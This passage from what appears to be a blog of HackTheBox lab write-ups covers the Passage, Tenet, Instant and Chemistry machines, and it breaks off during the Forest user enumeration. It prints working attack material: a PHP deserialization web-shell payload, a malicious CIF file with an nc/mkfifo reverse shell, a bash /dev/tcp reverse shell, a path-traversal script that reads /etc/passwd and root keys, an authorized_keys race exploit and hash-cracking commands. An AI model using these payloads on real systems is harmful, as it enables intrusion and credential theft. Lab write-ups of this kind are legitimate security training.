http://10.10.10.226, we get this page:\nHome Page At the bottom of the passage we can see that it is running \u0026ldquo;CuteNews\u0026rdquo;\nPowered by CuteNews Hovering over some of the author names, we can see that they point to some email addresses revealing potential usernames and the domain name of the box:\nNadav\u0026rsquo;s email Paul\u0026rsquo;s email Let\u0026rsquo;s note the usernames somewhere and add passage.htb to our hosts file.\nAfter examining the page source carefully, we find the /CuteNews endpoint containing a login page which also discloses the version of CuteNews which is 2.1.2:\nLogin page disclosing CuteNews version Exploitation # Googling \u0026lsquo;CuteNews 2.1.2 exploit\u0026rsquo;, we find this POC for CVE-2019-11447:\nRunning CuteNews RCE exploit POC After running it, we get a shell as www-data:\nShell as www-data Privesc # www-data -\u0026gt; paul # In /var/www/html/CuteNews/cdata/users, we can find different php files, which we can assume correspond to the data of the each user of the site.\nUsers data files The file lines contains all of the user data in base64 format. Using the following command, we can filter the base64 data and decode it:\nfor line in `cat lines | grep -v \u0026#34;access denied\u0026#34;`; do printf \u0026#34;\\n\u0026#34;;echo $line | base64 -d; printf \u0026#34;\\n\u0026#34;; done We get the password hashes of some users:\nPassword hashes nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 sid-meier:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 paul-coles:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd kim-swift:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc We can try to crack them with hashcat:\nhashcat -m 1400 hashes /usr/share/wordlists/rockyou.txt --username Only paul\u0026rsquo;s hash was cracked:\nPaul\u0026rsquo;s password cracked! Using this password we can switch to paul and retrieve the user flag:\nUser flag obtained! We could not log in via ssh with a password\nCannot login with password paul -\u0026gt; nadav # Trying to get paul\u0026rsquo;s ssh key in order to login via ssh, we notice that his key pair is tied to nadav:\nPaul\u0026rsquo;s ssh key shared with nadav Using the corresponding private key, we were able to login as nadav:\nShell as nadav nadav -\u0026gt; root # In the .viminfo file, we can see that nadav edited /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf\nNadav\u0026rsquo;s .viminfo history And in the command line history, we can see that they edited the AdminIdentities from the root group to the sudo group.\nNadav\u0026rsquo;s vim command history After some research about the USBCreator D-Bus interface, we find this article describing a vulnerability allowing an attacker with access to the sudoer group to bypass the password security policy imposed by the sudo program, essentially getting root privileges.\nThe com.ubuntu.USBCreator service is found to contain an implementation of the dd command, allowing us to copy files between locations. This allows a user to overwrite arbitrary files on the filesystem, as root, with no password prompting.\nFor example we can copy the private ssh key of the root user as follows:\ngdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true Root\u0026rsquo;s private ssh key With this key, we can log in as root and retrieve the root flag.\nRoot flag obtained ! ","date":"27 April 2025","externalUrl":null,"permalink":"/htb/passage/","section":"Htbs","summary":"","title":"HTB - Passage","type":"htb"},{"content":" Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it\u0026rsquo;s backup. It is possible after identificaiton of the backup file to review its source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user www-data to user Neil. Further system enumeration reveals that this user have root permissions to run a bash script through sudo. The script is writing SSH public keys to the authorized_keys file of the root user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the authorized_keys file and use them to login to the system as root. Port Scanning # From the results of the nmap scan, we see that we have 2 ports open: 22 and 80\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Web Server # Navigating to http://10.10.10.223, we get the default Apache page\nDefault Apache page Seeing this, we can try to launch a directory fuzzing in order to discover other pages:\nffuf -u \u0026#39;http://10.10.10.223/FUZZ\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -ic \u0026lt;SNIP...\u0026gt; wordpress [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 26ms] Short after, we discover a /wordpress endpoint. Navigating to http://10.10.10.223/wordpress we get the following:\nWordpress page Looks like the css did not load properly. Upon examining the page source, we discover that the css file are fetched under the domain tenet.htb.\nPage source After adding it to our hosts file and reloading the page, we are able to access the blog at http://tenet.htb\nWordpress page with css If we navigate at the bottom of the page, we can find something interesting:\nNeil\u0026rsquo;s comment on Migration post Migration post In the above comment, neil is mentioning a sator.php file and a backup. However /sator.php does not exist on the tenet.htb, let\u0026rsquo;s try the IP address instead.\n/sator.php We see something that looks like the output of a script. Assuming that the previously mentioned backup is of the sator.php file, we could try to get /sator.php.bak.\nPHP Code Review # And it indeed works, we downloaded the php file, we can now read its content:\n\u0026lt;?php class DatabaseExport { public $user_file = \u0026#39;users.txt\u0026#39;; public $data = \u0026#39;\u0026#39;; public function update_db() { echo \u0026#39;[+] Grabbing users from text file \u0026lt;br\u0026gt;\u0026#39;; $this-\u0026gt; data = \u0026#39;Success\u0026#39;; } public function __destruct() { file_put_contents(__DIR__ . \u0026#39;/\u0026#39; . $this -\u0026gt;user_file, $this-\u0026gt;data); echo \u0026#39;[] Database updated \u0026lt;br\u0026gt;\u0026#39;; // echo \u0026#39;Gotta get this working properly...\u0026#39;; } } $input = $_GET[\u0026#39;arepo\u0026#39;] ?? \u0026#39;\u0026#39;; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u0026gt; update_db(); ?\u0026gt; This script will initialize the $input variable with the value of the GET parameter arepo (set to \u0026lsquo;\u0026rsquo;, if not provided). It will then unserialize it and save it in $databaseupdate.\nLooking at the DatabaseExport class, we see that it has two attributes:\n$user_file $data The function update_db() just outputs some text and update the $data variable to \u0026lsquo;Success\u0026rsquo;.\nThe __destruct() function, which is a special function called when an object of type DatabaseExport is freed from the memory, will write to a file whatever is in the $data variable.\nWith all this information, we can write a web shell by doing the following:\nCreate a serialized object of type DatabaseExport with the $user_file variable set to the name of our webshell and $data set to the actual webshell php code. Pass this serialized object to the sator.php script through the GET parameter arepo. Then, the script will instanciate a new object with the provided data. Once the execution is done, the __destruct() method is called, and our webshell will be written. Deserialization to RCE # We can use the following php script to generate our serialized object:\n\u0026lt;?php class DatabaseExport { public $user_file = \u0026#34;shell.php\u0026#34;; public $data = \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39;; } $dbe = new DatabaseExport; echo \u0026#34;-\u0026gt; \u0026#34; . serialize($dbe) . \u0026#34;\\n\u0026#34;; ?\u0026gt; After executing the script, we get the following serialized object:\nO:14:\u0026#34;DatabaseExport\u0026#34;:2:{s:9:\u0026#34;user_file\u0026#34;;s:9:\u0026#34;shell.php\u0026#34;;s:4:\u0026#34;data\u0026#34;;s:30:\u0026#34;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#34;;} Now we can send it to the sator.php script:\nSending exploit to /sator.php Here we notice that [] Database updated \u0026lt;br\u0026gt; appears twice, indicating that the __destruct() method ran twice, which is a good sign.\nNow let\u0026rsquo;s see if our web shell was successfully created:\nWeb shell as www-data It was created. We can now get a reverse shell:\nExecuting reverse shell Catching reverse shell on netcat listener Privesc # www-data -\u0026gt; neil # Under /var/www/html/wordpress/wp-config.php, we can find a database password for the user neil:\nCredentials in wp-config.php Using it we can log in as neil and retrieve the user flag:\nUser flag obtained! neil -\u0026gt; root # The user neil can run the script /usr/local/bin/enableSSH.sh as root with no password.\nNeil\u0026rsquo;s sudo privileges Let\u0026rsquo;s examine the content of that script:\n#!/bin/bash checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \u0026#34; \u0026#34; -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026#34;Successfully added $sshName to authorized_keys file!\u0026#34; else /bin/echo \u0026#34;Error in adding $sshName to authorized_keys file!\u0026#34; fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \u0026#34;Error in creating key file!\u0026#34; if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u0026gt;\u0026gt;$tmpName checkFile $tmpName /bin/cat $tmpName \u0026gt;\u0026gt;/root/.ssh/authorized_keys /bin/rm $tmpName } key=\u0026#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\u0026#34; addKey checkAdded This script will basically create a temporary file with mktemp -u /tmp/ssh-XXXXXXXX, then check if the file is empty and if it is an actual file. If the check passes, the content of the $key variable will be appended to it. And finally the temporary will appended to /root/.ssh/authorized_keys.\nThe logic of this script opens the door for a potential race condition attack when the script is checking the newly created file (in the checkFile() function).\nTo exploit it, we can create a script that will constantly update all temporary file by writting into them our ssh public key. We win the race if our update happens after the check, this will add our public key into /root/.ssh/authorized_keys effectively allowing us to login as root.\nwhile true; do for tempfile in $(ls /tmp/ssh-*); do echo \u0026#34;\u0026lt;KEY_HERE\u0026gt;\u0026#34; \u0026gt; $tempfile; done; done We will have to run /usr/local/bin/enableSSH.sh multiple times until we win the race (the updating script should be running in the background):\nRace Condition won We can now login as root with the corresponding private key and retrieve the root flag:\nRoot flag obtained ! ","date":"27 April 2025","externalUrl":null,"permalink":"/htb/tenet/","section":"Htbs","summary":"","title":"HTB - Tenet","type":"htb"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/password-reuse/","section":"Tags","summary":"","title":"Password Reuse","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/race-condition/","section":"Tags","summary":"","title":"Race Condition","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"Rce","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/vim/","section":"Tags","summary":"","title":"Vim","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/vim-history/","section":"Tags","summary":"","title":"Vim History","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/wordpress/","section":"Tags","summary":"","title":"Wordpress","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/api-documentation/","section":"Tags","summary":"","title":"Api Documentation","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/api-endpoints/","section":"Tags","summary":"","title":"Api Endpoints","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/apk/","section":"Tags","summary":"","title":"Apk","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/apk-reversing/","section":"Tags","summary":"","title":"Apk Reversing","type":"tags"},{"content":" Instant is a medium difficulty machine covering Reverse Engineering of an android apk, API hacking and decryption of encrypted PuTTY session data.\nIt starts off by downloading the apk of a banking/finance app. After some static analysis, we find some endpoints in the source code. One of these endpoints contains the documentation of the API that the app communicates with. Reading that documentation allows us to spot vulnerability in one of the endpoints allowing us to read local files on the server. By leveraging that vulnerability, we are able to read the private key of a user on the box.\nAfter login in as that user, we find a certain file containing encrypted data of a PuTTY session which we are able to decrypt using a python script allowing us to get a root shell.\nPort Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMM6fK04LJ4jNNL950Ft7YHPO9NKONYVCbau/+tQKoy3u7J9d8xw2sJaajQGLqTvyWMolbN3fKzp7t/s/ZMiZNo= | 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL+zjgyGvnf4lMAlvdgVHlwHd+/U4NcThn1bx5/4DZYY 80/tcp open http syn-ack Apache httpd 2.4.58 |_http-title: Did not follow redirect to http://instant.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.58 (Ubuntu) Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel From the scan results, we see that we have 2 ports open:\n22 running ssh 80 running an Apache server redirecting to http://instant.htb Let\u0026rsquo;s add it to our host file\necho -e \u0026#34;\u0026lt;IP\u0026gt;\\tinstant.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Website # Now let\u0026rsquo;s navigate to http://instant.htb\nHome Page This seems to be a website for a mobile application. Clicking on \u0026lsquo;Download Now\u0026rsquo;, we can download the apk.\nDownloading apk file APK Reversing # We can use jadx to decompile the apk and get access to the source code.\nAfter opening the apk in jadx, we can use the search feature to look for endpoints that the application communicates with. We can try to search for .instant.htb for example:\nSearching for API endpoints We can see in the results different API endpoints in the mywalletv1 subdomain. Let\u0026rsquo;s add it to our hosts file and take look at the api.\nIn the second and third search results, we can see a token being set to the Authorization header:\nJWT token If we try to access an endpoint without the token, we get a 401:\ncurl http://mywalletv1.instant.htb/api/v1/view/profile {\u0026#34;Description\u0026#34;:\u0026#34;Unauthorized!\u0026#34;,\u0026#34;Status\u0026#34;:401} After adding the token:\ncurl http://mywalletv1.instant.htb/api/v1/view/profile -H \u0026#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA\u0026#34; {\u0026#34;Profile\u0026#34;:{\u0026#34;account_status\u0026#34;:\u0026#34;active\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@instant.htb\u0026#34;,\u0026#34;invite_token\u0026#34;:\u0026#34;instant_admin_inv\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;instantAdmin\u0026#34;,\u0026#34;wallet_balance\u0026#34;:\u0026#34;10000000\u0026#34;,\u0026#34;wallet_id\u0026#34;:\u0026#34;f0eca6e5-783a-471d-9d8f-0162cbc900db\u0026#34;},\u0026#34;Status\u0026#34;:200} This confirms the validity of the token. Now let\u0026rsquo;s see if there is a documentation for this api.\nDocumentation pages are usually found in endpoints like:\n/api /swagger/index.html /openapi.json Unfortunately, we don\u0026rsquo;t get any results with these. Let\u0026rsquo;s do another search with jadx, but this time adding more elements to our search such as classes, comments, etc:\nExtended search in jadx Now we find have another vhost: swagger-ui.instant.htb.\nAPI Documentation Swagger UI # Navigating to this website, we get the access to the documentation of the api:\nDocumentation page Let\u0026rsquo;s add our token by clicking on \u0026lsquo;Authorize\u0026rsquo;:\nAdding the JWT token Looking at the different endpoints, we can see one that stands out: /api/v1/admin/read/log\nEndpoint to read log files Parameter needed This could potentially lead to a LFI, allowing us to read local files on the server. Let\u0026rsquo;s first try to send a valid request to see what the response looks like:\nSending a valid request Foothold - User # Not only did we get the file, but also its full path. We could try to get access to the user\u0026rsquo;s private key by leveraging a path traversal as follows:\n../.ssh/id_rsa Reading private ssh key We got the private key. However, we\u0026rsquo;ll need to clean it up for it to be usable. We can do that with the following command:\ncat key | sed \u0026#39;s/^ \u0026#34;//\u0026#39; | sed \u0026#39;s/\\\\n\u0026#34;.*$//\u0026#39; | tee id_rsa This command copies the private key inside key and uses sed to remove anything unnecessary and writes the output to id_rsa. After that we can just change the permissions of the file (chmod 600 id_rsa) and use it to log in:\nUser flag obtained ! Root # Inside /opt/backups/Solar-PuTTY, there is a file called sessions-backup.dat. After a little bit of research, we see that we can use this script to decrypt the session file:\nRoot password With this password, we can switch to root\nRoot flag obtained ! ","date":"18 March 2025","externalUrl":null,"permalink":"/htb/instant/","section":"Htbs","summary":"","title":"HTB - Instant","type":"htb"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/jadx/","section":"Tags","summary":"","title":"Jadx","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/jadx-gui/","section":"Tags","summary":"","title":"Jadx-Gui","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/lfi/","section":"Tags","summary":"","title":"LFI","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/putty/","section":"Tags","summary":"","title":"Putty","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/putty-decrypt/","section":"Tags","summary":"","title":"Putty Decrypt","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/swagger/","section":"Tags","summary":"","title":"Swagger","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/aiohttp/","section":"Tags","summary":"","title":"AioHTTP","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/cif/","section":"Tags","summary":"","title":"Cif","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/cve-2024-23334/","section":"Tags","summary":"","title":"CVE-2024-23334","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/cve-2024-23346/","section":"Tags","summary":"","title":"CVE-2024-23346","type":"tags"},{"content":" Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the pymatgen (CVE-2024-23346) Python library by uploading a malicious CIF file to the hosted CIF Analyzer website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as rosa user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called AioHTTP (CVE-2024-23334) which is used on the web application running internally to read the root flag. Port Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 5000/tcp open upnp? syn-ack We got 2 ports open:\n22 running ssh 5000 running a web server Website # Navigating to http://10.10.11.38:5000, we get the following page:\nHome Page The content of the home page already gives us a hint:\nThis tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.\nWe also have the possibility to log in or to create an account.\nLogin Page # On the login page, I tried submitting some defaults credentials and quickly tested for basic sqli but without success:\nInvalid credentials Creating an account # We can try to register an account at /register\nRegistering an account After registering an account we get access to the following dashboard:\nDashboard The website allows us to upload a CIF file. It also provides us with an example at /static/example.cif:\ndata_Example _cell_length_a 10.00000 _cell_length_b 10.00000 _cell_length_c 10.00000 _cell_angle_alpha 90.00000 _cell_angle_beta 90.00000 _cell_angle_gamma 90.00000 _symmetry_space_group_name_H-M \u0026#39;P 1\u0026#39; loop_ _atom_site_label _atom_site_fract_x _atom_site_fract_y _atom_site_fract_z _atom_site_occupancy H 0.00000 0.00000 0.00000 1 O 0.50000 0.50000 0.50000 1 Exploit for CIF files # A searching for exploits involving CIF files, we find this security report showing how we can get RCE with a malicious CIF file using this POC:\ndata_5yOhtAoR _audit_creation_date 2018-06-08 _audit_creation_method \u0026#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit\u0026#34; loop_ _parent_propagation_vector.id _parent_propagation_vector.kxkykz k1 [0 0 0] _space_group_magn.transform_BNS_Pp_abc \u0026#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\u0026#34;__sub\u0026#34; + \u0026#34;classes__\u0026#34;]) () if d.__name__ == \u0026#34;BuiltinImporter\u0026#34;][0].load_module (\u0026#34;os\u0026#34;).system (\u0026#34;touch pwned\u0026#34;);0,0,0\u0026#39; _space_group_magn.number_BNS 62.448 _space_group_magn.name_BNS \u0026#34;P n\u0026#39; m a\u0026#39; \u0026#34; Let\u0026rsquo;s replace the command with a reverse shell:\ndata_5yOhtAoR _audit_creation_date 2018-06-08 _audit_creation_method \u0026#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit\u0026#34; loop_ _parent_propagation_vector.id _parent_propagation_vector.kxkykz k1 [0 0 0] _space_group_magn.transform_BNS_Pp_abc \u0026#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\u0026#34;__sub\u0026#34; + \u0026#34;classes__\u0026#34;]) () if d.__name__ == \u0026#34;BuiltinImporter\u0026#34;][0].load_module (\u0026#34;os\u0026#34;).system (\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2\u0026gt;\u0026amp;1|nc 10.10.14.4 1337 \u0026gt;/tmp/f\u0026#34;);0,0,0\u0026#39; _space_group_magn.number_BNS 62.448 _space_group_magn.name_BNS \u0026#34;P n\u0026#39; m a\u0026#39; \u0026#34; Now let\u0026rsquo;s upload it:\nUploading malicious CIF file After clicking on upload, we see that we can view it or delete it:\nFile uploaded If we click on view, we get a 500 Internal server error, and we don\u0026rsquo;t get a reverse shell.\n500 Internal server error However if we replace the command with just nc \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt;, we get a connection.\nIn this case, we can upload the reverse shell, and then execute it\nHosting reverse shell with python http server The file shell.sh contains the following:\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/1337 0\u0026gt;\u0026amp;1 After, uploading and clicking on view, we see the file was downloaded:\nHit on python http server We can now change the command, so that our reverse shell is executed\nChanging the command in cif file After re-uploading the file, and then clicking on View, we finally get a shell back:\nReverse shell Foothold \u0026amp; User Flag # In our current directory, we find the source code of the website in app.py which also contains credentials:\nCredentials in app.py After looking around some more, we find a the sqlite database inside the instance directory.\napp@chemistry:~/instance$ file database.db database.db: SQLite 3.x database, last written using SQLite version 3031001 Looking at the contents of this file with strings, we are able to get the hashes of the users:\nUsers\u0026rsquo; hashes Let\u0026rsquo;s try to crack the hash of the user rosa, since they are on the machine:\nhashcat -m 0 \u0026#39;\u0026lt;HASH\u0026gt;\u0026#39; /usr/share/wordlists/rockyou.txt We can ssh as rosa and retrieve the user flag\nUsdr flag obtained ! Root Flag # After some enumeration, we find out that something is running on 127.0.0.1:8080\nNetstat output We can forward that port to our machine with:\nssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38 Now after going to http://127.0.0.1:8080, we get access to this website allowing us to list services:\nMonitoring website Looking at the response headers, we see something unusual for the Server header (Python/3.9 aiohttp/3.9.1):\nResponse Headers After some reasearch, we see that it might be vulnerable to CVE-2024-23334 which is a path traversal vulnerability.\nUsing this poc (with some little changes):\n#!/bin/bash url=\u0026#34;http://127.0.0.1:8080\u0026#34; string=\u0026#34;../\u0026#34; payload=\u0026#34;/\u0026#34; file=\u0026#34;etc/passwd\u0026#34; for ((i=0; i\u0026lt;15; i++)); do payload+=\u0026#34;$string\u0026#34; echo \u0026#34;[+] Testing with $payload$file\u0026#34; status_code=$(curl --path-as-is -s -o /dev/null -w \u0026#34;%{http_code}\u0026#34; \u0026#34;$url$payload$file\u0026#34;) echo -e \u0026#34;\\tStatus code --\u0026gt; $status_code\u0026#34; if [[ $status_code -eq 200 ]]; then curl -s --path-as-is \u0026#34;$url$payload$file\u0026#34; break fi done We were able to retrieve the /etc/passwd file:\nReading /etc/passwd We can repeat the same process in order to read the private key of the root user:\nReading root\u0026rsquo;s private key We can use it to login as root and retrieve the flag:\nRoot flag obtained ! ","date":"3 March 2025","externalUrl":null,"permalink":"/htb/chemistry/","section":"Htbs","summary":"","title":"HTB - Chemistry","type":"htb"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/path-traversal/","section":"Tags","summary":"","title":"Path Traversal","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory","type":"tags"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/tags/asreproasting/","section":"Tags","summary":"","title":"Asreproasting","type":"tags"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/tags/bloodhound/","section":"Tags","summary":"","title":"Bloodhound","type":"tags"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/tags/dcsync/","section":"Tags","summary":"","title":"Dcsync","type":"tags"},{"content":" Forest in an easy difficulty Windows Domain Controller. We are able to enumerate domain users through a NULL session. Once we have our list of users, we notice that there is a service account svc-alfresco, we then decide to check if there are any account with kerberos pre-authentication enabled. We discover that we are able to get the hash for that service account (ASREPRoasting) and easily crack it, thus gaining a foothold in the domain. We then enumerate the domain with bloodhound just to find that this user has some interesting group memberships and privileges eventually allowing us to perform DCSync and get the Administrator NTLM hash which we then use with winrm to gain an Administrator shell. Port Scanning # PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-16 21:23:22Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49681/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 50033/tcp open msrpc Microsoft Windows RPC From the scan results, we got the domain name (htb.local) as well as the hostname of the machine (FOREST). We can add them to our host file:\necho -e \u0026#34;10.129.30.97\\tFOREST FOREST.htb.local htb.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Foothold # User Enumeration # First let\u0026rsquo;s see if we can enumerate users with rpcclient by leveraging a SMB null session:\nrpcclient -N -U \u0026#34;\u0026#34; 10.129.30.97 rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] 